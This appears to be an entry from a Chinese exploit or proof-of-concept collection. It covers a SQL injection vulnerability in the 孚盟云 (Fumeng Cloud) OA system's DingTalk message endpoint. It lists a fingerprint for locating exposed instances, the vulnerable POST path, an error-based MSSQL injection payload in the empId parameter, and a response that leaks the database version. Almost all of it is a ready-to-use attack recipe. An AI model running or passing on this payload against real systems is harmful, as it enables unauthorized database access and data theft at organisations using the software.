# 孚盟云oaajaxsenddingdingmessagesql注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`body="hidLicResult"`
- **请求**：`POST /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx HTTP/1.1`

**Payload**
```
action=SendDingMeg_Mail&empId=2'+and+1=@@VERSION--+
```
- **响应特征**：200 Mircrosoft SQL Server 2012